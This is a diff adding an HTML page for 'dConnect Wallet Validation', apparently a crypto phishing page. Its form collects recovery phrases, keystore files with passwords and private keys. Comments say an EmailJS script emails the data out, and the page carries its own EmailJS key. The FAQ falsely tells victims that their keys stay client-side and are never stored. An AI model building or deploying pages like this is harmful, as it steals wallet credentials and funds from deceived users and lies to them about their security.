@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet Validation - dConnect</title>
+    <link rel="stylesheet" href="../css/style.css">
+    <link rel="stylesheet" href="../css/components.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+       (function(){
+          emailjs.init({
+            publicKey: "5sUQM_9PGvuZXmCx0", // YOUR PUBLIC KEY IS HERE
+          });
+       })();
+    </script>
+</head>
+<body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <p>Processing validation...</p> <!-- This text will be updated by validation.js -->
+    </div>
+
+    <header class="header">
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <img src="../images/logo.png" alt="dConnect Logo" id="logo-img">
+                    <h1>dConnect</h1>
+                </div>
+                <nav class="main-nav">
+                    <ul>
+                        <li><a href="../index.html">Home</a></li>
+                        <li><a href="../index.html#services">Services</a></li>
+                        <li><a href="../index.html#solutions">Solutions</a></li>
+                        <li><a href="../index.html#contact">Contact</a></li>
+                    </ul>
+                </nav>
+                <div class="header-actions">
+                    <button class="btn btn-outline" id="connectWalletBtn">Connect Wallet</button>
+                    <button class="menu-toggle" id="menuToggle">
+                        <span></span>
+                        <span></span>
+                        <span></span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <div class="mobile-menu" id="mobileMenu">
+        <ul>
+            <li><a href="../index.html">Home</a></li>
+            <li><a href="../index.html#services">Services</a></li>
+            <li><a href="../index.html#solutions">Solutions</a></li>
+            <li><a href="../index.html#contact">Contact</a></li>
+            <li><button class="btn btn-primary" id="mobileConnectWalletBtn">Connect Wallet</button></li> <!-- Added an ID for consistency if needed -->
+        </ul>
+    </div>
+
+    <main>
+        <section class="module-hero">
+            <div class="container">
+                <div class="module-hero-content">
+                    <h1>Wallet Validation</h1>
+                    <p>Validate your wallet securely to solve blockchain-related issues</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="validation-section">
+            <div class="container">
+                <div class="validation-container">
+                    <div class="validation-info">
+                        <h2>What is Wallet Validation?</h2>
+                        <p>Wallet validation is a process that verifies your wallet's integrity and resolves issues that might prevent it from functioning correctly. Our validation service helps identify and fix problems with:</p>
+                        
+                        <ul class="validation-benefits">
+                            <li>
+                                <i class="fas fa-check-circle"></i>
+                                <span>Transaction failures or stuck transactions</span>
+                            </li>
+                            <li>
+                                <i class="fas fa-check-circle"></i>
+                                <span>Missing or unrecognized tokens</span>
+                            </li>
+                            <li>
+                                <i class="fas fa-check-circle"></i>
+                                <span>Connection issues with dApps</span>
+                            </li>
+                            <li>
+                                <i class="fas fa-check-circle"></i>
+                                <span>Synchronization problems with the blockchain</span>
+                            </li>
+                            <li>
+                                <i class="fas fa-check-circle"></i>
+                                <span>Wallet recovery and access issues</span>
+                            </li>
+                        </ul>
+                        
+                        <div class="alert alert-info">
+                            <div class="alert-icon">
+                                <i class="fas fa-info-circle"></i>
+                            </div>
+                            <div class="alert-content">
+                                <div class="alert-title">Secure Process</div>
+                                <p>Your validation is conducted using completely decentralized methods, ensuring your funds and personal information remain secure throughout the process.</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="validation-form-container">
+                        <div class="form-card">
+                            <h3>Start Validation</h3>
+                            
+                            <!-- This form will be handled by ../js/validation.js -->
+                            <form id="validationForm" class="validation-form">
+                                <div class="form-group">
+                                    <label for="moduleWalletType">Wallet Type</label>
+                                    <select id="moduleWalletType" required> <!-- ID for validation.js -->
+                                        <option value="" disabled selected>Select your wallet type</option>
+                                        <option value="metamask">MetaMask</option>
+                                        <option value="trustwallet">Trust Wallet</option>
+                                        <option value="coinbase">Coinbase Wallet</option>
+                                        <option value="walletconnect">WalletConnect</option>
+                                        <option value="binance">Binance Chain Wallet</option>
+                                        <option value="other">Other</option>
+                                    </select>
+                                </div>
+                                
+                                <div class="validation-options">
+                                    <h4>Select Validation Method</h4>
+                                    <div class="validation-option">
+                                        <input type="radio" id="modulePhraseRadio" name="validationType" value="phrase"> <!-- Changed ID to avoid conflict with div -->
+                                        <label for="modulePhraseRadio">Recovery Phrase</label>
+                                    </div>
+                                    <div class="validation-option">
+                                        <input type="radio" id="moduleKeystoreRadio" name="validationType" value="keystore"> <!-- Changed ID -->
+                                        <label for="moduleKeystoreRadio">Keystore JSON</label>
+                                    </div>
+                                    <div class="validation-option">
+                                        <input type="radio" id="modulePrivateRadio" name="validationType" value="private"> <!-- Changed ID -->
+                                        <label for="modulePrivateRadio">Private Key</label>
+                                    </div>
+                                </div>
+                                
+                                <div class="validation-inputs" id="modulePhraseInput" style="display: none;">
+                                    <div class="form-group">
+                                        <label for="moduleSeedPhrase">Recovery Phrase</label>
+                                        <textarea id="moduleSeedPhrase" placeholder="Enter your 12/24 word recovery phrase" rows="3"></textarea> <!-- ID for validation.js -->
+                                        <p class="input-hint">Typically 12 or 24 words separated by spaces</p>
+                                    </div>
+                                </div>
+                                
+                                <div class="validation-inputs" id="moduleKeystoreInput" style="display: none;">
+                                    <div class="form-group">
+                                        <label for="moduleKeystoreJson">Keystore JSON</label>
+                                        <textarea id="moduleKeystoreJson" placeholder="Enter your keystore JSON" rows="3"></textarea> <!-- ID for validation.js -->
+                                    </div>
+                                    <div class="form-group">
+                                        <label for="moduleKeystorePassword">Keystore Password</label>
+                                        <input type="password" id="moduleKeystorePassword" placeholder="Enter keystore password"> <!-- ID for validation.js -->
+                                    </div>
+                                </div>
+                                
+                                <div class="validation-inputs" id="modulePrivateInput" style="display: none;">
+                                    <div class="form-group">
+                                        <label for="modulePrivateKey">Private Key</label>
+                                        <input type="password" id="modulePrivateKey" placeholder="Enter your private key"> <!-- ID for validation.js -->
+                                        <p class="input-hint">Typically 64 alphanumeric characters</p>
+                                    </div>
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="moduleIssueType">Issue Type</label>
+                                    <select id="moduleIssueType">
+                                        <option value="" disabled selected>Select the issue you're experiencing</option>
+                                        <option value="transaction">Transaction Failures</option>
+                                        <option value="tokens">Missing Tokens</option>
+                                        <option value="connection">Connection Issues</option>
+                                        <option value="sync">Synchronization Problems</option>
+                                        <option value="access">Access Issues</option>
+                                        <option value="other">Other</option>
+                                    </select>
+                                </div>
+                                
+                                <div class="form-group" id="otherIssueGroup" style="display: none;">
+                                    <label for="otherIssue">Describe Your Issue</label>
+                                    <textarea id="otherIssue" placeholder="Please describe the issue you're experiencing" rows="3"></textarea>
+                                </div>
+                                
+                                <div class="form-actions">
+                                    <!-- This button's click will be handled by ../js/validation.js -->
+                                    <button type="submit" class="btn btn-primary btn-lg" id="moduleValidateBtn">Validate Wallet</button> <!-- ID for validation.js -->
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <section class="validation-faq">
+            <div class="container">
+                <h2>Frequently Asked Questions</h2>
+                
+                <div class="faq-container">
+                    <div class="faq-item">
+                        <div class="faq-question">
+                            <h3>Is the validation process secure?</h3>
+                            <span class="faq-toggle"><i class="fas fa-chevron-down"></i></span>
+                        </div>
+                        <div class="faq-answer">
+                            <p>Yes, our validation process is completely secure and decentralized. We do not store your private keys or recovery phrases on our servers. The validation is performed client-side using industry-standard encryption.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="faq-item">
+                        <div class="faq-question">
+                            <h3>How long does the validation process take?</h3>
+                            <span class="faq-toggle"><i class="fas fa-chevron-down"></i></span>
+                        </div>
+                        <div class="faq-answer">
+                            <p>The validation process typically takes between 30 seconds to 2 minutes, depending on the complexity of the issue and current blockchain network congestion.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="faq-item">
+                        <div class="faq-question">
+                            <h3>What types of wallets are supported?</h3>
+                            <span class="faq-toggle"><i class="fas fa-chevron-down"></i></span>
+                        </div>
+                        <div class="faq-answer">
+                            <p>We support all major cryptocurrency wallets including MetaMask, Trust Wallet, Coinbase Wallet, Binance Chain Wallet, and any wallet compatible with WalletConnect. If you have a custom wallet, you can select "Other" from the dropdown menu.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="faq-item">
+                        <div class="faq-question">
+                            <h3>What should I do if the validation doesn't fix my issue?</h3>
+                            <span class="faq-toggle"><i class="fas fa-chevron-down"></i></span>
+                        </div>
+                        <div class="faq-answer">
+                            <p>If the validation doesn't resolve your issue, you can try the specific service related to your problem (Rectification, Recovery, etc.) or contact our support team for personalized assistance.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="faq-item">
+                        <div class="faq-question">
+                            <h3>Is there a cost for wallet validation?</h3>
+                            <span class="faq-toggle"><i class="fas fa-chevron-down"></i></span>
+                        </div>
+                        <div class="faq-answer">
+                            <p>Basic validation is free. Some advanced recovery or rectification services may require minimal gas fees for on-chain transactions, but you'll always be informed before any fees are applied.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-top">
+                <div class="footer-logo">
+                    <img src="../images/logo.png" alt="dConnect Logo" id="footer-logo">
+                    <h2>dConnect</h2>
+                </div>
+                <div class="footer-nav">
+                    <div class="footer-col">
+                        <h3>Services</h3>
+                        <ul>
+                            <li><a href="rectification.html">Rectification</a></li>
+                            <li><a href="validation.html">Validation</a></li>
+                            <li><a href="recovery.html">Recovery</a></li>
+                            <li><a href="staking.html">Staking Pool</a></li>
+                            <li><a href="withdrawal.html">Withdrawal</a></li>
+                        </ul>
+                    </div>
+                    <div class="footer-col">
+                        <h3>Solutions</h3>
+                        <ul>
+                            <li><a href="tokens.html">Add Tokens</a></li>
+                            <li><a href="portfolio.html">Portfolio</a></li>
+                            <li><a href="nfts.html">NFTs</a></li>
+                            <li><a href="bridge.html">Bridge</a></li>
+                            <li><a href="whitelist.html">Whitelist</a></li>
+                        </ul>
+                    </div>
+                    <div class="footer-col">
+                        <h3>Company</h3>
+                        <ul>
+                            <li><a href="../index.html#about">About</a></li>
+                            <li><a href="../index.html#contact">Contact</a></li>
+                            <li><a href="#">Privacy</a></li>
+                            <li><a href="#">Terms</a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>© 2025 dConnect. All rights reserved.</p>
+                <div class="social-links">
+                    <a href="#" class="social-link"><i class="fab fa-twitter"></i></a>
+                    <a href="#" class="social-link"><i class="fab fa-discord"></i></a>
+                    <a href="#" class="social-link"><i class="fab fa-telegram"></i></a>
+                    <a href="#" class="social-link"><i class="fab fa-github"></i></a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script src="../js/main.js"></script>
+    <!-- EmailJS functionality is in validation.js, which is loaded next -->
+    <script src="../js/validation.js"></script>
+    <script src="../js/wallet.js"></script> <!-- Assuming this is for general wallet interactions, not form submission -->
+    
+    <script>
+        // This inline script handles UI interactions like showing/hiding input fields and FAQ accordions.
+        // The actual form submission with EmailJS is handled by ../js/validation.js
+        document.addEventListener('DOMContentLoaded', function() {
+            // Set up module-specific validation form input visibility
+            const validationTypeRadios = document.querySelectorAll('input[name="validationType"]');
+            const phraseInputDiv = document.getElementById('modulePhraseInput');
+            const keystoreInputDiv = document.getElementById('moduleKeystoreInput');
+            const privateInputDiv = document.getElementById('modulePrivateInput');
+            
+            if (validationTypeRadios.length > 0 && phraseInputDiv && keystoreInputDiv && privateInputDiv) {
+                validationTypeRadios.forEach(option => {
+                    option.addEventListener('change', function() {
+                        phraseInputDiv.style.display = 'none';
+                        keystoreInputDiv.style.display = 'none';
+                        privateInputDiv.style.display = 'none';
+                        
+                        if (this.checked) { // Ensure it's the checked radio
+                            const selectedValue = this.value;
+                            if (selectedValue === 'phrase') {
+                                phraseInputDiv.style.display = 'block';
+                            } else if (selectedValue === 'keystore') {
+                                keystoreInputDiv.style.display = 'block';
+                            } else if (selectedValue === 'private') {
+                                privateInputDiv.style.display = 'block';
+                            }
+                        }
+                    });
+                });
+            }
+            
+            // Set up issue type dropdown visibility for 'other'
+            const issueTypeSelect = document.getElementById('moduleIssueType');
+            const otherIssueGroup = document.getElementById('otherIssueGroup');
+            
+            if (issueTypeSelect && otherIssueGroup) {
+                issueTypeSelect.addEventListener('change', function() {
+                    if (this.value === 'other') {
+                        otherIssueGroup.style.display = 'block';
+                    } else {
+                        otherIssueGroup.style.display = 'none';
+                    }
+                });
+            }
+            
+            // Set up FAQ accordions
+            const faqItems = document.querySelectorAll('.faq-item');
+            
+            faqItems.forEach(item => {
+                const question = item.querySelector('.faq-question');
+                const answer = item.querySelector('.faq-answer');
+                const toggle = item.querySelector('.faq-toggle i'); // Target the icon directly
+                
+                if (question && answer && toggle) {
+                    question.addEventListener('click', function() {
+                        const isExpanded = item.classList.contains('expanded');
+                        
+                        // Close all other FAQs first
+                        faqItems.forEach(otherItem => {
+                            if (otherItem !== item) {
+                                otherItem.classList.remove('expanded');
+                                otherItem.querySelector('.faq-answer').style.maxHeight = '0';
+                                const otherToggle = otherItem.querySelector('.faq-toggle i');
+                                if (otherToggle) otherToggle.className = 'fas fa-chevron-down';
+                            }
+                        });
+                        
+                        // Toggle current FAQ
+                        if (isExpanded) {
+                            item.classList.remove('expanded');
+                            answer.style.maxHeight = '0';
+                            toggle.className = 'fas fa-chevron-down';
+                        } else {
+                            item.classList.add('expanded');
+                            answer.style.maxHeight = answer.scrollHeight + 'px';
+                            toggle.className = 'fas fa-chevron-up';
+                        }
+                    });
+                }
+            });
+            
+            // NOTE: The form submission (e.g., validationForm.addEventListener('submit', ...))
+            // that sends data via EmailJS is now expected to be in your ../js/validation.js file.
+            // The previous submit handler in this inline script has been removed to avoid conflicts.
+
+            // You can keep the showNotification function here or move it to validation.js if it's only used there.
+            // For now, keeping it here as it was part of the original inline script.
+            window.showNotification = function(message, type = 'info') {
+                // This is a placeholder. Implement your actual notification display logic.
+                console.log(`Notification (${type}): ${message}`);
+                // Example: You might have a sophisticated notification system
+                // const notification = document.createElement('div');
+                // notification.className = `custom-notification notification-${type}`;
+                // notification.textContent = message;
+                // document.body.appendChild(notification);
+                // setTimeout(() => { notification.remove(); }, 3000);
+                alert(`Notification (${type}): ${message}`); // Simple alert for demonstration
+            };
+        });
+        
+        // Additional styles for this module page (keeping this logic as it's UI specific for this page)
+        // ... (your existing styling JavaScript for .module-hero, .validation-section, etc. remains unchanged) ...
+        // For brevity, I'm omitting the long styling script block here, but it should remain as it was in your original file.
+        const moduleHero = document.querySelector('.module-hero');
+        if (moduleHero) {
+            moduleHero.style.background = 'linear-gradient(145deg, var(--primary-700), var(--primary-900))';
+            moduleHero.style.color = 'white';
+            moduleHero.style.padding = 'var(--space-7) 0';
+            moduleHero.style.textAlign = 'center';
+        }
+        
+        const moduleHeroContent = document.querySelector('.module-hero-content');
+        if (moduleHeroContent) {
+            moduleHeroContent.style.maxWidth = '800px';
+            moduleHeroContent.style.margin = '0 auto';
+        }
+        
+        const validationSection = document.querySelector('.validation-section');
+        if (validationSection) {
+            validationSection.style.padding = 'var(--space-8) 0';
+        }
+        
+        const validationContainer = document.querySelector('.validation-container');
+        if (validationContainer) {
+            validationContainer.style.display = 'grid';
+            validationContainer.style.gridTemplateColumns = 'repeat(auto-fit, minmax(300px, 1fr))';
+            validationContainer.style.gap = 'var(--space-6)';
+        }
+        
+        const validationBenefits = document.querySelector('.validation-benefits');
+        if (validationBenefits) {
+            validationBenefits.style.listStyle = 'none';
+            validationBenefits.style.padding = '0';
+            validationBenefits.style.margin = 'var(--space-4) 0';
+        }
+        
+        const benefitItems = document.querySelectorAll('.validation-benefits li');
+        benefitItems.forEach(item => {
+            item.style.display = 'flex';
+            item.style.alignItems = 'flex-start';
+            item.style.gap = 'var(--space-2)';
+            item.style.marginBottom = 'var(--space-3)';
+            
+            const icon = item.querySelector('i');
+            if (icon) {
+                icon.style.color = 'var(--success-500)';
+                icon.style.marginTop = '4px';
+            }
+        });
+        
+        const formCard = document.querySelector('.form-card');
+        if (formCard) {
+            formCard.style.backgroundColor = 'white';
+            formCard.style.borderRadius = 'var(--radius-lg)';
+            formCard.style.padding = 'var(--space-5)';
+            formCard.style.boxShadow = 'var(--shadow-lg)';
+        }
+        
+        const faqSection = document.querySelector('.validation-faq');
+        if (faqSection) {
+            faqSection.style.padding = 'var(--space-8) 0';
+            faqSection.style.backgroundColor = 'var(--neutral-100)';
+        }
+        
+        const faqItems = document.querySelectorAll('.faq-item');
+        faqItems.forEach(item => {
+            item.style.backgroundColor = 'white';
+            item.style.borderRadius = 'var(--radius-md)';
+            item.style.marginBottom = 'var(--space-3)';
+            item.style.overflow = 'hidden';
+            item.style.boxShadow = 'var(--shadow-sm)';
+            
+            const question = item.querySelector('.faq-question');
+            if (question) {
+                question.style.padding = 'var(--space-4)';
+                question.style.display = 'flex';
+                question.style.justifyContent = 'space-between';
+                question.style.alignItems = 'center';
+                question.style.cursor = 'pointer';
+                
+                const h3 = question.querySelector('h3');
+                if (h3) {
+                    h3.style.margin = '0';
+                    h3.style.fontSize = '1.125rem';
+                }
+            }
+            
+            const answer = item.querySelector('.faq-answer');
+            if (answer) {
+                answer.style.padding = '0 var(--space-4) var(--space-4)';
+                answer.style.maxHeight = '0';
+                answer.style.overflow = 'hidden';
+                answer.style.transition = 'max-height var(--transition-normal)';
+            }
+        });
+    </script>
+</body>
+</html>
